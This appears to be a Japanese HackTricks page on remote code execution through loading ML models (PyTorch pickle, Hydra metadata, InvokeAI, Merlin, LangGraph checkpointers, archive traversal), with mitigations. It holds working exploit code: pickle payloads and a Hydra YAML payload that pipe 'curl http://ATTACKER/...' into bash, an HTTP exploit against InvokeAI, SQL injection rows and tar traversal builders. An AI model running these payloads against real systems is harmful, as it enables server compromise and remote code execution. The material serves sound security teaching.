# Models RCE

{{#include ../banners/hacktricks-training.md}}

## モデルのロードによるRCE

Machine Learningモデルは通常、ONNX、TensorFlow、PyTorchなど、さまざまな形式で共有されます。これらのモデルは、開発者のマシンや本番システムにロードして使用できます。通常、モデルに悪意のあるコードが含まれるべきではありませんが、意図された機能として、またはモデルのロードライブラリの脆弱性によって、モデルを使用してシステム上で任意のコードを実行できる場合があります。

以下の表に、このカテゴリにおける代表的な脆弱性を示します。

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | モデルチェックポイント内の悪意のあるpickleによりコード実行（`weights_only` safeguardを回避）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 悪意のあるモデルのダウンロードによりコード実行、management APIにおけるJava deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | 信頼できないチェックポイントにより、`load_model_trainer_states_from_checkpoint` 内でpickle reducerがトリガーされ、ML workerでコード実行            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | ユーザー制御の `filter` キーによりSQL/JSON-path構文を注入し、`UNION SELECT` で偽のチェックポイント行を作成した後、`msgpack` deserializationが攻撃者の選択したPythonコードをimportして呼び出す | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAMLからモデルをロードすると `yaml.unsafe_load` が使用される（コード実行） <br> **Lambda** layerを使用してモデルをロードすると任意のPythonコードが実行される          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | 細工された `.tflite` モデルによりinteger overflowが発生し、heap corruptionを引き起こす（RCEの可能性）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` によりモデルをロードすると、攻撃者の `__reduce__` payloadを含むpickleが実行される                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` のデフォルト設定ではpickled object arraysが許可されており、悪意のある `.npy/.npz` によりコード実行がトリガーされる                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNXモデルのexternal-weights pathがディレクトリ外へ脱出できる（任意のファイルを読み取る） <br> 悪意のあるONNX model tarにより任意のファイルを上書きできる（RCEにつながる） | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | custom operatorを含むモデルでは攻撃者のnative codeのロードが必要となり、複雑なmodel graphsによりロジックが悪用され、意図しない処理が実行される   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` を有効にしてmodel-load APIを使用すると、relative path traversalによりファイルを書き込める（例：RCEのために `.bashrc` を上書きする）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | 不正なGGUF model fileによりparser内でheap buffer overflowsが発生し、被害者のシステム上で任意のコード実行が可能になる                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda layerを含む悪意のあるHDF5（`.h5`）モデルでは、ロード時にコードが依然として実行される（Keras safe_modeは旧形式を対象としない ― “downgrade attack”） | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 多くのML tools（例：pickleベースのmodel formatsやPython `pickle.load`）では、対策がなければmodel filesに埋め込まれた任意のコードが実行される | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 攻撃者が制御するmodel metadata/configにより `_target_` を任意のcallable（例：`builtins.exec`）に設定し、ロード中に実行させる。 “safe” formats（`.safetensors`、`.nemo`、repo `config.json`）でも同様 | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

さらに、[PyTorch](https://github.com/pytorch/pytorch/security)で使用されるものなど、Python pickleベースのモデルには、`weights_only=True` でロードされない場合にシステム上で任意のコードを実行できるものがあります。そのため、pickleベースのモデルは、上の表に記載されていない場合でも、この種の攻撃を特に受けやすい可能性があります。

### Hydra metadata → RCE (safetensorsでも機能)

`hydra.utils.instantiate()` は、configuration/metadata object内の任意のドット区切り `_target_` をimportして呼び出します。Hugging Face Transformersなどのlibrariesが**信頼できないmodel metadata**を `instantiate()` に渡す場合、攻撃者はcallableと引数を指定でき、モデルのロード中に即座に実行させることができます（pickleは不要）。<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payloadの例（`.nemo` の `model_config.yaml`、repo `config.json`、または `.safetensors` 内の `__metadata__` で機能します）：
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
キーポイント:
- NeMo の `restore_from/from_pretrained`、uni2TS HuggingFace coders、FlexTok loaders で、model initialization 前に trigger される。
- Hydra の string block-list は、alternative import paths（例: `enum.bltns.eval`）や application-resolved names（例: `nemo.core.classes.common.os.system` → `posix`）によって bypass 可能。<sup>[[14]](#references)</sup>
- FlexTok は `ast.literal_eval` を使って stringified metadata も parse するため、Hydra call 前に DoS（CPU/memory blowup）が可能。

### 🆕  `torch.load` による InvokeAI RCE（CVE-2024-12029）

`InvokeAI` は Stable-Diffusion 用の人気のある open-source web interface。**5.3.1 – 5.4.2** では、ユーザーが arbitrary URLs から models を download and load できる REST endpoint `/api/v2/models/install` が公開されている。<sup>[[1]](#references)</sup>

内部では、この endpoint は最終的に次を call する:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
指定されたファイルが **PyTorch checkpoint（`*.ckpt`）** の場合、`torch.load` は **pickle deserialization** を実行します。コンテンツは user-controlled URL から直接取得されるため、攻撃者は checkpoint 内にカスタム `__reduce__` メソッドを持つ悪意のあるオブジェクトを埋め込めます。このメソッドは **deserialization 中に実行** され、InvokeAI server 上で **remote code execution（RCE）** につながります。

この脆弱性には **CVE-2024-12029**（CVSS 9.8、EPSS 61.17 %）が割り当てられました。

#### Exploitation walk-through

1. 悪意のある checkpoint を作成します。
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 自分が管理する HTTP server 上に `payload.ckpt` をホストします（例: `http://ATTACKER/payload.ckpt`）。
3. 脆弱な endpoint をトリガーします（認証は不要です）：
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI がファイルをダウンロードすると `torch.load()` を呼び出し、`os.system` gadget が実行され、攻撃者は InvokeAI プロセスのコンテキストで code execution を獲得します。

すぐに使える exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` が一連のフロー全体を自動化します。<sup>[[3]](#references)</sup>

#### Conditions

•  InvokeAI 5.3.1-5.4.2（scan flag のデフォルトは **false**）
•  `/api/v2/models/install` に攻撃者が到達可能
•  Process に shell commands を実行する権限がある

#### Mitigations

* **InvokeAI ≥ 5.4.3** に upgrade する - patch によりデフォルトで `scan=True` が設定され、deserialization の前に malware scanning が実行されます。<sup>[[2]](#references)</sup>
* Checkpoint を programmatically load する場合は `torch.load(file, weights_only=True)` または新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper を使用します。
* Model source と signature に allow-list を適用し、least-privilege で service を実行します。

> ⚠️ 信頼できない source から deserialize する場合、**Python pickle ベースの format（多数の `.pt`、`.pkl`、`.ckpt`、`.pth` files を含む）はすべて本質的に unsafe** であることを忘れないでください。

---

古い InvokeAI versions を reverse proxy の背後で実行し続ける必要がある場合の、ad-hoc mitigation の例:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec unsafe `torch.load` による RCE (CVE-2025-23298)

NVIDIA の Transformers4Rec (Merlin の一部) は、ユーザーが指定したパスに対して直接 `torch.load()` を呼び出す unsafe な checkpoint loader を公開していました。`torch.load` は Python の `pickle` に依存しているため、攻撃者が制御する checkpoint は、デシリアライゼーション中の reducer を介して任意のコードを実行できます。<sup>[[5]](#references)</sup>

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

RCE につながる理由: Python の pickle では、オブジェクトに reducer (`__reduce__`/`__setstate__`) を定義し、callable と引数を返させることができます。callable は unpickling 中に実行されます。このようなオブジェクトが checkpoint に含まれていると、weights が使用される前に実行されます。

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- repos、buckets、または artifact registries 経由で共有される Trojanized checkpoints/models
- checkpoints を自動的にロードする Automated resume/deploy pipelines
- 実行は training/inference workers 内で行われ、多くの場合 elevated privileges（例: containers 内の root）で実行される

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)（PR #802）では、直接的な `torch.load()` を、`transformers4rec/utils/serialization.py` に実装された restricted な allow-listed deserializer に置き換えた。新しい loader は types/fields を検証し、load 中に arbitrary callables が呼び出されるのを防止する。<sup>[[7]](#references)</sup>

PyTorch checkpoints に固有の Defensive guidance:
- untrusted data を unpickle しない。可能な場合は、[Safetensors](https://huggingface.co/docs/safetensors/index) や ONNX のような non-executable formats を優先する。
- PyTorch serialization を使用する必要がある場合は、`weights_only=True`（新しい PyTorch でサポート）を確実に使用するか、Transformers4Rec patch と同様の custom allow-listed unpickler を使用する。<sup>[[4]](#references)</sup>
- model provenance/signatures を強制し、deserialization を sandbox 化する（seccomp/AppArmor、non-root user、restricted FS、network egress なし）。
- checkpoint load 時に ML services から予期しない child processes が生成されていないか監視し、`torch.load()`/`pickle` の使用状況を trace する。

POC and vulnerable/patch references:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Example – malicious PyTorch model の作成

- model を作成する:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- モデルをロードする：
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent の FaceDetection-DSFD は、ユーザーが制御するデータを deserialization する `resnet` endpoint を公開しています。ZDI は、remote attacker が被害者に malicious page/file を読み込ませ、それによって crafted serialized blob をその endpoint に送信させ、`root` として deserialization を実行させられることを確認しました。これにより、システムが完全に compromise されます。

この exploit flow は、典型的な pickle abuse と同様です:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
デシリアライズ中に到達可能な gadget（constructors、`__setstate__`、framework callbacks など）は、transport が HTTP、WebSocket、または watched directory に配置された file のいずれであっても、同じ方法で weaponize できます。



### LangGraph checkpointer SQLi → MessagePack RCE

この attack chain が興味深いのは、attacker が **malicious model file を upload する必要がない** 点です。代わりに、application は **AI-agent persistence API**（`get_state_history(..., filter=...)`）を公開しており、user input が checkpointer query builder に到達します。

#### 1. Metadata filters の構造的 SQLi

脆弱な SQLite pattern は次のようなものでした。
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
値は後からバインドされますが、`query_key` は **JSON path string** に連結されるため、dictionary key 内の `'` によって `'$.{query_key}'` から抜け出し、SQLを injection できます。同じ教訓は **JSON paths、identifiers、operators、`LIMIT`、TTL fields** にも当てはまります。placeholders で保護できるのは values だけであり、query syntax の構造部分は保護できません。

#### 2. `UNION SELECT` はデータ窃取だけでなく、後続の sinks も標的にできる

この query は `type` と serialized `checkpoint` bytes を返し、それらは後から次のように消費されます：
```python
self.serde.loads_typed((type, checkpoint))
```
つまり、`WHERE`句のSQLiは**偽の結果行**を注入できます：
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
後続のコードが選択されたカラムを parse、deserialize、write、または execute する場合、それらのカラムを対応する sink にマッピングします。このケースでは、偽の行によって SQLi が **attacker-controlled deserialization** に変わります。

#### 3. Unsafe MessagePack extension hooks は code gadgets と同等

LangGraph の `msgpack` path では、ネストされた tuple を unpack して実行する custom extension hook が使用されていました：
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
そのため、`("os", "system", "id > /tmp/pwned")` と同等の内容をエンコードした MessagePack extension object は、`os` を import し、`system` を解決して、コマンドを実行します。AI frameworks をレビューする際は、動的 import、reflection、または任意の callable dispatch を行う **custom MessagePack/JSON/pickle revivers** を調査してください。

#### 4. Practical audit pattern for agent frameworks

次の項目に到達する、ユーザーが制御可能な入力をすべてレビューしてください。
- state history / memory / replay / checkpoint listing APIs
- SQL または Redis query fragments を生成する structured filter builders
- custom deserializers（`pickle`、`msgpack`、`json` object hooks、YAML constructors）
- persistence layer から返された rows を信頼する recovery paths

この特定の chain は、信頼できないユーザーが `filter` を制御できる、**SQLite** または **Redis** checkpointers を使用した self-hosted LangGraph deployments に影響しました。disclosure で記載された patched versions は、`langgraph-checkpoint-sqlite 3.0.1+`、`langgraph 1.0.10+`、`langgraph-checkpoint-redis 1.0.2+`、および `langgraph-checkpoint 4.0.1+` です。<sup>[[15]](#references)</sup>

## Models to Path Traversal

[**この blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) で説明されているように、異なる AI frameworks で使用される多くの models formats は通常 `.zip` などの archives に基づいています。そのため、これらの formats を悪用して Path Traversal attacks を実行し、model がロードされるシステムから任意のファイルを読み取れる可能性があります。<sup>[[16]](#references)</sup>

例えば、次の code を使用すると、ロード時に `/tmp` directory 内へファイルを作成する model を作成できます。
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
または、以下のコードを使うと、ロード時に `/tmp` ディレクトリへのシンボリックリンクを作成するモデルを作成できます。
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 詳細解説: Keras .keras のデシリアライゼーションと gadget hunting

.keras の内部構造、Lambda-layer RCE、≤ 3.8 における arbitrary import issue、および修正後に allowlist 内で gadget discovery を行う方法についての集中的なガイドは、以下を参照してください:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – 「CVE-2024-12029 – InvokeAI における信頼できないデータのデシリアライゼーション」](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI パッチコミット 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit モジュールのドキュメント](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load のセキュリティに関する考慮事項](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – 「CVE-2025-23298 – NVIDIA Merlin で Remote Code Execution を取得する」](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec パッチコミット b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [パッチ適用前の脆弱な loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [悪意のある checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [パッチ適用後の loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 最新の AI/ML 形式とライブラリを使用した Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate のドキュメント](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list コミット (RCE に関する警告)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi から RCE へ: LangGraph の Checkpointer を exploit](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip バグを高価値な AI/ML バウンティへ pivot する](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
